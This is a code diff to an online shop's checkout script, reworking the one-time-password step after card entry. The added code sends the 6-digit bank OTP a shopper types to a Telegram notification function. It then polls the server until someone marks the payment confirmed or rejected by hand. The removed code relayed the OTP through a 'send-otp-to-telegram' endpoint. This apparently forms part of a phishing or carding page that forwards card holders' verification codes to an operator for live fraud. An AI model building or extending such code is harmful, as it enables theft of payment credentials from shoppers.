@@ -2205,172 +2205,103 @@ cardErrors.style.display = 'none'; // Clear errors if valid
 return true;
 }
 
+// Setup OTP input and submit button behavior
 function setupOTPInputs() {
     const otpInput = document.getElementById('otp-single-input');
-    const submitBtn = document.getElementById('otp-submit-btn');
+    const submitBtn = document.getElementById('verify-otp-btn'); // Assuming this is your verify button ID
 
     if (!otpInput || !submitBtn) return;
 
-    // Only allow numeric and max 6 chars
+    // Allow only numeric input, max 6 digits
     otpInput.addEventListener('input', (e) => {
         let val = e.target.value.replace(/\D/g, '').substring(0, 6);
         e.target.value = val;
-        submitBtn.disabled = val.length !== 6;  // enable only when length is 6
+        submitBtn.disabled = val.length !== 6; // Enable button only if 6 digits entered
     });
 
     submitBtn.addEventListener('click', (e) => {
         e.preventDefault();
-        submitOTP();
+        verifyOTP();
     });
 
-    submitBtn.disabled = true;
+    submitBtn.disabled = true; // Initially disable the button
 }
 
-function submitOTP() {
-    const otpInput = document.getElementById('otp-single-input');
-    if (!otpInput) return alert('OTP input missing');
-
-    const otp = otpInput.value.trim();
-    if (otp.length !== 6) {
-        alert('Please enter the 6-digit OTP');
-        return;
-    }
-
-    // Send OTP + orderRef to backend or Telegram API
-    fetch('/api/send-otp-to-telegram', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            otp,
-            orderRef: checkoutData.orderRef
-        })
-    })
-    .then(res => res.json())
-    .then(data => {
-        if (data.sent) {
-            alert('OTP sent for confirmation. Please wait...');
-            // Show waiting UI — polling for confirmation status
-            waitForTelegramConfirmation(checkoutData.orderRef);
-        } else {
-            alert('Failed to send OTP for confirmation. Try again.');
-        }
-    })
-    .catch(() => alert('Network error sending OTP.'));
-}
-
-function waitForTelegramConfirmation(orderRef) {
-    const interval = setInterval(() => {
-        fetch(`/api/check-payment-status?orderRef=${orderRef}`)
-            .then(res => res.json())
-            .then(data => {
-                if (data.status === 'confirmed') {
-                    clearInterval(interval);
-                    alert('Payment confirmed! Thank you.');
-                    goToCheckoutStep('success'); // or show success page
-                    clearCart();
-                } else if (data.status === 'rejected') {
-                    clearInterval(interval);
-                    alert('Payment rejected. Please try again.');
-                    goToCheckoutStep('failure'); // or show failure page
-                }
-                // else still pending, keep polling
-            })
-            .catch(() => {
-                clearInterval(interval);
-                alert('Error checking payment status. Please refresh.');
-            });
-    }, 5000); // poll every 5 seconds
-}
-
-// Call this when user inputs OTP and submits
+// Verify OTP entered by user
 function verifyOTP() {
     const otpInput = document.getElementById('otp-single-input');
     const otpError = document.getElementById('otp-error');
+
     if (!otpInput) {
-        console.error('OTP input not found');
+        console.error('OTP input element not found');
         return;
     }
 
-    const enteredOTP = otpInput.value.trim();
+    const otp = otpInput.value.trim();
 
-    // Validate OTP format
-    if (enteredOTP.length === 6 && /^\d{6}$/.test(enteredOTP)) {
-        // Hide any error message
-        if (otpError) otpError.style.display = 'none';
-
-        // Send OTP to Telegram for manual confirmation
-        if (typeof TelegramNotifications !== 'undefined') {
-            TelegramNotifications.userEnteredOTP(enteredOTP);
-        }
-
-
-
-		function skipOTP() {
-    // Optional: notify Telegram that OTP was skipped
-    if (typeof TelegramNotifications !== 'undefined') {
-        TelegramNotifications.otpSkipped?.(); // Optional chaining
-    }
-
-    console.warn('User skipped OTP. Proceeding to next step.');
-    goToCheckoutStep('success'); // or whatever your next step is
-}
-
-        // Show processing step (spinner)
-        goToCheckoutStep(4);
-
-        // Wait for Telegram confirmation (simulate with a promise)
-        waitForTelegramConfirmation()
-            .then(() => {
-                // Payment confirmed
-                processOrder();
-            })
-            .catch(() => {
-                // Payment failed or not confirmed in time
-                showPaymentFailure();
-            });
-
-    } else {
-        // Show error for invalid OTP
+    // Validate OTP: must be exactly 6 digits
+    if (!/^\d{6}$/.test(otp)) {
         if (otpError) {
             otpError.style.display = 'block';
-            const errorText = otpError.querySelector('span');
-            if (errorText) {
-                errorText.textContent = "Please enter a valid 6-digit OTP";
-            }
+            otpError.querySelector('span').textContent = "Please enter a valid 6-digit OTP";
         }
+        return;
+    } else if (otpError) {
+        otpError.style.display = 'none';
     }
+
+    // Show processing UI step (assumes step 4 is a processing spinner)
+    goToCheckoutStep(4);
+
+    // Send OTP to Telegram via your notification function
+    if (typeof sendTelegramNotification === 'function') {
+        sendTelegramNotification(checkoutData.orderRef, otp);
+    } else {
+        console.warn('sendTelegramNotification function is not defined.');
+    }
+
+    // Start polling for confirmation from Telegram/Make scenario
+    waitForTelegramConfirmation(checkoutData.orderRef)
+        .then(() => {
+            processOrder();
+        })
+        .catch(() => {
+            showPaymentFailure();
+        });
 }
 
-// Adjusted waitForTelegramConfirmation to use the polling you already have:
+// Poll the backend to check payment status every 5 seconds
 function waitForTelegramConfirmation(orderRef) {
     return new Promise((resolve, reject) => {
         const interval = setInterval(() => {
-            fetch(`/api/check-payment-status?orderRef=${orderRef}`)
+            fetch(`/api/check-payment-status?orderRef=${encodeURIComponent(orderRef)}`)
                 .then(res => res.json())
                 .then(data => {
                     if (data.status === 'confirmed') {
                         clearInterval(interval);
                         alert('Payment confirmed! Thank you.');
-                        resolve(); // Resolve promise on confirmation
+                        resolve();
                     } else if (data.status === 'rejected') {
                         clearInterval(interval);
                         alert('Payment rejected. Please try again.');
-                        reject(); // Reject promise on failure
+                        reject();
                     }
-                    // If still pending, keep polling
+                    // If still pending, do nothing and keep polling
                 })
-                .catch(() => {
+                .catch(err => {
                     clearInterval(interval);
                     alert('Error checking payment status. Please refresh.');
+                    console.error('Error polling payment status:', err);
                     reject();
                 });
-        }, 5000); // poll every 5 seconds
+        }, 5000);
     });
 }
 
-// Use this to show payment failure UI, e.g. failure step in checkout
+// Show UI for payment failure
 function showPaymentFailure() {
-    goToCheckoutStep('failure'); // Replace with your actual failure step number or id
+    goToCheckoutStep('failure'); // Replace 'failure' with your actual failure step or ID
+
     const processingElement = document.getElementById('processing-payment');
     if (processingElement) processingElement.style.display = 'none';
 
@@ -2380,20 +2311,33 @@ function showPaymentFailure() {
     console.log('Payment failed or was not confirmed.');
 }
 
-// Your existing processOrder function (simplified for success scenario)
+// Handle successful order processing
 function processOrder() {
     try {
-        goToCheckoutStep('success'); // Show success step/page
+        goToCheckoutStep('success'); // Replace 'success' with your actual success step or ID
 
-        // Clear cart or do any finalization
         clearCart();
 
         console.log('Order processed successfully:', checkoutData.orderRef);
     } catch (error) {
-        console.error('Error in processOrder:', error);
+        console.error('Error during order processing:', error);
         alert('Error completing order. Please try again.');
     }
 }
+
+// Optional: skip OTP verification and proceed
+function skipOTP() {
+    if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.otpSkipped) {
+        TelegramNotifications.otpSkipped();
+    }
+    console.warn('User skipped OTP. Proceeding to next step.');
+    goToCheckoutStep('success'); // or next appropriate step
+}
+
+// Initialize OTP inputs on page load or step render
+document.addEventListener('DOMContentLoaded', () => {
+    setupOTPInputs();
+});
 
 
 // Generate and download PDF invoice
